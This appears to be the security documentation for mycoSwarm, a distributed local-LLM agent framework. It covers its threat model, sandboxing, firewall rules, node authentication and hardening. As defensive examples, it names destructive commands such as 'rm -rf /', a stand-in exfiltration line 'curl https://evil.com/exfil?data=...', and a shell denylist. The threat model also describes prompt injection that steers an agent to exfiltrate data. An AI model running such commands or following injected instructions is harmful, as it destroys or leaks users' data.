# 🔒 mycoSwarm Security Model

Security in a distributed AI framework isn't optional — it's foundational. When you give an LLM the ability to execute shell commands, read files, and communicate across machines on your network, the attack surface is real. mycoSwarm is designed to be **secure by default**, not secure by configuration.

If you follow the install instructions without reading this document, you should end up with a system that is safe to run. This document exists for those who want to understand *why* it's safe, and for those who want to make it even safer.

---

## Threat Model

mycoSwarm operates in home and small-office LANs. The threats are practical, not theoretical.

### What we defend against

**LLM hallucination.** The model generates a destructive command — `rm -rf /`, `curl` to an external server, overwrite a config file. This is the most common real-world risk. Models aren't malicious; they're confident and wrong.

**Prompt injection.** A malicious document, web page, or skill tricks the model into executing unintended commands. A poisoned research result tells the agent to exfiltrate data or modify its own instructions.

**Rogue node.** An unauthorized device on the LAN tries to inject tasks into the swarm or intercept results between nodes.

**Data exfiltration.** Prompts, research, or generated content leaving the network without the user's knowledge — either through a hallucinated command or a compromised dependency.

**Privilege escalation.** A compromised agent process tries to access system files, SSH keys, API tokens, or other users' data.

**Supply chain.** Malicious or compromised dependencies in the Python package ecosystem.

### What we do NOT defend against

- A dedicated attacker with root access to your machines (if they're already root, it's over)
- Nation-state level network interception (use a VPN or Tor if this is your threat model)
- Physical access to your hardware
- Social engineering of the human operator

---

## The Seven Layers

### Layer 1: Process Isolation

Every mycoSwarm agent runs as a **dedicated unprivileged user** — never as root, never as your personal account.

```bash
sudo useradd -m -s /bin/bash mycoswarm
```

This means:
- The agent cannot read your SSH keys, browser data, or personal files
- The agent cannot install system packages or modify system configs
- The agent cannot access other users' home directories
- Even if the agent is fully compromised, the blast radius is limited to one user's home directory

**Why this matters:** Most AI agent frameworks run as whatever user launched them. If that's your personal account, a single hallucinated `rm` command can delete your documents. mycoSwarm isolates the blast radius by design.

### Layer 2: Workspace Sandboxing

All file operations are restricted to a designated workspace directory. The agent cannot read, write, or list files outside this path.

```
/home/mycoswarm/
├── workspace/          ← agent can read/write here
│   ├── articles/
│   ├── research/
│   └── artifacts/
├── mycoswarm-src/      ← read-only after install
└── .config/mycoswarm/  ← config, read-only at runtime
```

**Implementation:**
- All tool functions validate paths against the workspace root before execution
- Path traversal attempts (`../`, symlink escapes) are detected and rejected
- Source code directory is locked read-only after installation: `chmod -R a-w ~/mycoswarm-src/`
- Config files are readable but not writable by the agent process at runtime

### Layer 3: Shell Execution Controls

Shell execution is the highest-risk capability. mycoSwarm applies defense in depth:

**Allowlist mode (default).** Only pre-approved commands can be executed. The agent can run `ls`, `cat`, `grep`, `python3` (within workspace), but not `rm -rf`, `sudo`, `ssh`, `scp`, `chmod`, or `curl` (to external addresses).

**Denylist mode (optional).** All commands allowed except an explicit blocklist. Less secure, more flexible. Intended for advanced users who understand the tradeoffs.

**Full audit logging.** Every shell command is logged with timestamp, full arguments, working directory, and exit code. Logs are written outside the agent's workspace so they cannot be tampered with.

```
/var/log/mycoswarm/
├── shell.log       ← every command the agent executes
├── network.log     ← every outbound connection attempt
└── tool.log        ← every tool call with arguments and results
```

### Layer 4: Network Isolation

**LAN-only by default.** No mycoSwarm service binds to `0.0.0.0`. All services listen on the LAN interface only.

**Outbound firewall.** The mycoswarm user is firewalled to LAN + localhost only:

```bash
# iptables rules for the mycoswarm user
sudo iptables -A OUTPUT -m owner --uid-owner mycoswarm -d 127.0.0.0/8 -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner mycoswarm -d 192.168.0.0/16 -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner mycoswarm -d 10.0.0.0/8 -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner mycoswarm -d 172.16.0.0/12 -j ACCEPT
sudo iptables -A OUTPUT -m owner --uid-owner mycoswarm -j DROP
```

**Why this matters:** If the LLM hallucinates a `curl https://evil.com/exfil?data=...` command, the packet is silently dropped. Your data stays on your network. Even if an agent is fully compromised, it cannot phone home.

**Controlled internet access:** Nodes that need web search capability get internet access through a proxy or domain allowlist — never as unrestricted outbound.

### Layer 5: Inter-Node Authentication

Nodes don't trust each other by default. A device appearing on your LAN cannot automatically join the swarm or inject tasks.

**Phase 1 — Shared secret.** All nodes in a swarm share a token generated at initialization. Every inter-node API request includes this token. Simple, effective, sufficient for a home LAN where all nodes are under your physical control.

```json
{
  "swarm": {
    "secret": "generated-256-bit-token",
    "name": "home-cluster"
  }
}
```

**Phase 2 — Mutual TLS (mTLS).** Each node gets a certificate signed by a swarm-local CA. Nodes verify each other's certificates before accepting connections. Prevents eavesdropping and impersonation even on untrusted or shared networks.

**What this prevents:**
- A compromised IoT device on your network can't inject tasks
- A neighbor on the same subnet (shared apartment, dorm) can't access your cluster
- A misconfigured service can't accidentally interact with swarm endpoints

### Layer 6: Model Trust Boundaries

**Local models only by default.** The framework ships configured for Ollama on localhost. No cloud API keys, no outbound model API calls.

**Structured task routing.** The orchestrator does not forward raw user text between nodes. Task descriptions use a structured schema (JSON), not freeform text. This limits the surface area for prompt injection propagation — a poisoned prompt on one node can't easily hijack another node's agent through the orchestrator.

**Model output validation.** Tool calls generated by the model are validated against the tool schema before execution. Malformed or unexpected tool calls are rejected and logged.

### Layer 7: Dependency Hygiene

**Minimal dependencies.** The core framework targets the smallest possible dependency tree. Every direct dependency is documented with its purpose, license, and risk assessment.

**Pinned versions.** All dependencies are pinned to exact versions. No floating ranges, no `>=` specifiers that could pull in a compromised update.

**Audit on install.** The install process runs `pip audit` and reports any known vulnerabilities in the dependency tree before proceeding.

**No post-install hooks.** The framework does not execute arbitrary code during installation beyond standard Python packaging. No setup.py scripts downloading external resources.

---

## Default Configuration

Out of the box, mycoSwarm ships with this security posture:

```json
{
  "security": {
    "sandboxMode": true,
    "shellMode": "allowlist",
    "networkMode": "lan-only",
    "authMode": "shared-secret",
    "logging": {
      "shell": true,
      "network": true,
      "tools": true
    }
  }
}
```

You don't have to configure anything to be secure. Every relaxation is opt-in and logged.

---

## Hardening Checklist

For every node in your swarm:

- [ ] Dedicated `mycoswarm` user created (not root, not your personal account)
- [ ] `sandboxMode: true` in config
- [ ] Workspace directory set and bounded
- [ ] Source code set to read-only (`chmod -R a-w ~/mycoswarm-src/`)
- [ ] Firewall rules restricting mycoswarm user to LAN + localhost
- [ ] Swarm secret generated and distributed to all nodes
- [ ] All services bound to LAN interface, not `0.0.0.0`
- [ ] Logging enabled for shell, network, and tool calls
- [ ] `pip audit` clean on all dependencies
- [ ] No cloud API keys in config unless intentionally added
- [ ] All unused interfaces/channels disabled

---

## Incident Response

If you suspect a node has been compromised:

1. **Isolate.** Disconnect the node from the network.
2. **Check logs.** Review `/var/log/mycoswarm/shell.log` for unexpected commands.
3. **Audit workspace.** Check what files were created or modified in the workspace.
4. **Rotate secrets.** Generate a new swarm secret and distribute to all healthy nodes.
5. **Rebuild.** The node is commodity hardware. Wipe, reinstall, rejoin. That's the advantage of building from scraps — nodes are disposable.

---

## Security Philosophy

Security in mycoSwarm follows the same principle as the framework itself: **work with what's there, don't fight it.**

Home networks are not enterprise datacenters. Users are not sysadmins. The security model must be:

- **Secure by default** — no configuration required to be safe
- **Understandable** — no jargon that only infosec professionals can parse
- **Proportional** — defenses match actual threats, not imaginary ones
- **Non-annoying** — security that gets in the way of work gets disabled, so it must not get in the way

The goal is that a user who installs mycoSwarm and starts using it — without ever reading this document — ends up with a system that won't destroy their files, leak their data, or let a hallucinating LLM run wild on their network.

---

## Reporting Vulnerabilities

If you find a security issue in mycoSwarm:

1. **Do not** open a public GitHub issue for security vulnerabilities
2. Email the maintainers directly (address TBD)
3. Include: what you found, how to reproduce it, and any suggested fix
4. We will acknowledge within 48 hours and work toward a fix

Thank you for helping keep the swarm safe. 🍄
